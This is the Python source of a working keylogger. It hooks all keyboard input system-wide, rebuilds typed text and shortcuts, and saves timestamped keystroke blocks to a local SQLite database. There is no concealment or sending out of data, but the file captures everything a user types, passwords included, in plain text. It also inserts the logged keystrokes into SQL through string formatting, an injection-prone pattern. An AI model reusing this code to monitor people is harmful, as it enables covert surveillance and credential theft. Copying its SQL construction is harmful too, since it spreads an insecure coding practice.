import time, sys
import keyboard
import sqlite3
import os
try:
    os.system("color 0b")
except Exception as _e:
    print(str(_e))
class KeyboardLog():
    """
    select datetime(date, "unixepoch"), keypress_block from keyboard_log;
    """
    def __init__(self):
        self.ready_to_commit = False
        #with sqlite3.connect('keyboard_log.db', check_same_thread=False) as con: #
        self.con = sqlite3.connect('keyboard_log.db', check_same_thread=False)
        self.cur = self.con.cursor()
        self.debug = True
        

        init_cmd = '''CREATE TABLE IF NOT EXISTS keyboard_log (id integer primary key autoincrement, date text, keypress_block text)'''
        self.cur.execute(init_cmd)
        self.con.commit()

        cmd = f"INSERT INTO keyboard_log VALUES(NULL, '{str(time.time())}', 'KEYLOG STARTED')"    
        self.cur.execute(cmd)
        self.con.commit()
        #con.close()
        
        #keyboard.hook(callback, suppress=False, on_remove=<lambda>)
        self.prev_block_end = time.time()
        self.prev_keypress = "space"
        self.prev_block = []
        self.block = []
        self.prev_keypress_time = time.time()
        keyboard.hook(self.log_keypress)
        keyboard.wait()

    def debug_print(self, text):
        if self.debug:
            print("[DEBUG]" +text)
    def dbg_print(self,text):
        if self.debug:
            print("[DEBUG]" +text)
    def add_block_record(self, date_time, keypress_block):
        self.debug_print(str(("add_block_record:", keypress_block)))
        if keypress_block == [] or keypress_block == ['']:
            pass
        block = "".join(keypress_block)
        
        if block == '' or len(block) == 0:
            pass
        else:
            cmd = f"INSERT INTO keyboard_log VALUES(NULL, '{date_time}', '{block}')"
            print("CMD:\n", cmd, len(block))
            self.cur.execute(cmd)
            self.con.commit()


    def log_keypress(self, event):
        #print(dir(event))
        if len(event.name) == 1:
            msg = "[" + str(ord(event.name)) + "] : [" + event.name + "]"
        else:
            msg = "[" + event.name + "]"
        print(msg)
        #print(event.event_type, event.modifiers, event.name, event.scan_code, event.time, event.to_json)
        if event.event_type == "down":
            shiftchars = {"1" : "!", "2" : "@", "3" : "#", 
                          "4" : "$", "5" : "%", "6" : "^", 
                          "7" : "&", "8" : "*", "9" : "(",
                          "0" : ")", "-" : "_", "=" : "+", 
                          "`" : "~", "\\": "|", "/" : "?",
                          "[" : "{", "]" : "}", "," : "<",
                          "." : ">", "/" : "?"}
            
            chars1 = ["^","'", '"', ";", ":",",", ".", 
                     "\\", "?", "!", "@", "_", "(",
                     ")", "-", "=", "+", "#", "$", "~",
                     "%", "*", "<", ">", "/", "|", "&"]
            
            if time.time() - self.prev_keypress_time > 5:
                pass

            if event.name == 'tab':
                if event.modifiers and "alt" in event.modifiers:
                    self.prev_keypress = ' <alt+tab> '
                    self.prev_block = list(self.block)
                    self.add_block_record(str(time.time()), self.block)
                    self.ready_to_commit = True
                    self.block = [' <alt+tab> ']
                    self.add_block_record(str(time.time()), self.block)
                    self.block = []

                else:
                    self.block.append("\t")
            
            elif len(event.name) == 1 and ord(event.name) in (8722,): #minus (Dell vostro)
                self.debug_print("minus")
                if event.modifiers and "shift" in event.modifiers:
                    if self.block and self.block[-1] == "⇫":
                        self.block = self.block[:-1]
                    self.block.append("_")
                else:
                    self.block.append("-")
            #elif event.modifiers and "shift" in event.modifiers and event.name == "shift":
            #    if self.block and self.block[-1] == "⇫":
            elif event.name in shiftchars:
                self.debug_print("shiftchars")
                if event.modifiers and "shift" in event.modifiers:     
                    if self.block and self.block[-1] == "⇫":
                        self.block = self.block[:-1]
                    self.block.append(shiftchars[event.name])
                else:
                    self.block.append(event.name)

            
            elif event.name in ("{", "}", "<", ">"):
                if event.modifiers and "shift" in event.modifiers:     
                    if self.block and self.block[-1] == "⇫":
                        self.block = self.block[:-1]
                self.block.append(event.name)
            
            elif event.name == "enter":
                self.debug_print("ADDING RECORD")
                self.prev_keypress = "enter"
                self.block.append("<enter>")
                self.prev_block = list(self.block)
                self.add_block_record(str(time.time()), self.block)

                self.block = []
                self.debug_print("enter")
                
            elif event.name in ["up", "down", "right", "left"]:
                arrows =  {"up" : "↑", "down" : "↓", "right" : "→", "left" : "←"}
                self.block.append(arrows[event.name])
                self.debug_print("arrows")
            elif event.name == "space":
                self.debug_print("space")
                self.block.append(" ")
                self.debug_print("space")
                
            elif event.name == "backspace":
                self.block.append("⇍")
            elif event.name == "delete":
                self.block.append("↛")
            elif event.name == "c" and "ctrl" in event.modifiers:
                self.block.append('<COPY>')
            elif event.name == "v" and "ctrl" in event.modifiers:
                self.block.append('<PASTE>')
            elif event.name == "ctrl":
                if self.block and self.block[-1] == "<ctrl>":
                    pass
                else:
                    self.block.append("<ctrl>")

            elif event.name == "windows":
                self.block.append('<WIN>')
            elif event.name == "page down":
                self.block.append('<PGDN>')
            elif event.name == "page up":
                self.block.append('<PGUP>')    
            elif event.name == "end":
                self.block.append('<END>')
            elif event.name == "esc":
                #self.close_db()
                self.block.append('<ESC>')
            
            elif not event.modifiers and event.name.isalpha() and len(event.name) == 1: #without shift
                self.block.append(event.name)
                self.debug_print("#1")
            #with shift
            elif event.modifiers and event.name.isalpha() and len(event.name) == 1 and "shift" in event.modifiers:
                #print("DBG: removed shift? : ", self.block[-1])
                self.debug_print("#2")
                if self.block and self.block[-1] == "⇫":
                    self.block = self.block[:-1] #remove shift
                self.block.append(event.name)
            
            elif event.modifiers and event.name in chars1 and "shift" in event.modifiers:
            
                if event.name == "'":
                    self.debug_print("#3")
                    self.block.append('"')    
                else:
                    self.block.append(event.name)
            elif event.name in chars1 and not event.modifiers:
                if event.name == "'":
                    self.debug_print("#5")
                    self.block.append('"')    
                else:
                    self.block.append(event.name)
            
            elif event.name == "page up":
                self.block.append(" <PAGEUP> ")
            
            elif event.name == "page down":
                self.block.append(" <PAGEDOWN> ")

            elif event.name == "shift":
                if event.modifiers and "alt" in event.modifiers:
                    self.block.append(" <shift+alt> ")
                else:
                    self.block.append("⇫")

            elif event.name == "alt":
                self.dbg_print("alt")
                if event.modifiers and "shift" in event.modifiers:
                    if self.block and self.block[-1] == "⇫":
                        self.block = self.block[:-1] #remove shift
                    self.block.append("<shift+alt>")
                else:
                    if self.block and self.block[-1] == "<alt>":
                        pass
                    else:
                        self.block.append("<alt>")
            else:
                self.debug_print(str(event.name.isalpha()))
                self.debug_print("#4")
                
            #print(event.modifiers, event.name, event.time) #, event.to_json())
    
    def close_db(self):
        print("CLOSING DATABASE...")
        keyboard.unhook_all()
        self.con.close()
        sys.exit()


# Insert a row of data
#cur.execute("INSERT INTO stocks VALUES ('2006-01-05','BUY','RHAT',100,35.14)")

if __name__ == "__main__":
    try:
        k = KeyboardLog()
    #k.add_block_record(str(time.time()), "abc shift SSS alt tab enter /n")
    except Exception as _e:
        print(str(_e))